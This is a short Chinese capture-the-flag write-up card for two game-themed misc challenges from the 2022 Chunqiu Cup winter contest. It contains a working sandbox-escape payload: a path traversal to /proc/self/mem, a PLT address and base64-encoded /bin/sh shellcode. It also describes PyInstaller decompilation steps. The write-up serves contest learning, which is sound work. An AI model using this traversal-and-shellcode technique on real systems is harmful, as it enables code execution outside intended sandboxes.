---
title: "春秋杯冬季赛游戏类misc题解析：《楠之勇者传》、《驯鹿游戏》"
category: misc
tags: ["春秋杯冬季赛", "misc", "文字游戏", "Python沙箱", "/proc/self/mem", "plt注入"]
signals: ["春秋杯冬季赛 2022", "文字游戏", "Python沙箱", "/proc/self/mem", "plt注入", "PyInstaller反编译", "base64魔法", "春秋GAME", "file_read", "proc", "self", "mem", "PLT", "shellcode"]
difficulty: medium
source: "https://www.ctfiot.com/89111.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 春秋杯冬季赛游戏类misc题解析：《楠之勇者传》、《驯鹿游戏》

> 赛事：春秋杯冬季赛 2022 | 方向：misc | 难度：medium

## 一句话总结

春秋杯冬两游戏题：楠之勇者传/proc/self/mem写PLT注入shellcode+驯鹿游戏PyInstaller补pyc头反编译

## 攻击链

1. 楠之勇者传：买基础魔杖触发base64编码写入→目录穿越../../../../../../../proc/self/mem+seek偏移→向python3.6 write PLT写shellcode→/bin/sh→驯鹿游戏：PyInstaller Extractor+补pyc头550d0d0a+uncompyle6反编译→getczekolada()返回gzip解压flag

## 关键 payload

```
../../../../proc/self/mem;elf.plt['write']=4327552;shellcraft.sh() base64;b64encode(asm(shellcraft.sh()))=amhIuC9iaW4vLy9zUEiJ52hyaQEBgTQkAQEBATH2VmoIXkgB5lZIieYx0mo7WA8F;550d0d0a 00000000 00000000 pyc头
```

## 经验教训

/proc/self/mem可绕过沙箱向python plt写shellcode（PIE关闭时基址固定）；PyInstaller补pyc头550d0d0a即可uncompyle6

## 标签

文字游戏、Python沙箱、/proc/self/mem、plt注入、PyInstaller反编译、base64魔法、春秋GAME

## 参考来源

- https://www.ctfiot.com/89111.html
- 原文件：春秋杯冬季赛游戏类misc题解析：《楠之勇者传》、《驯鹿游戏》.full.md
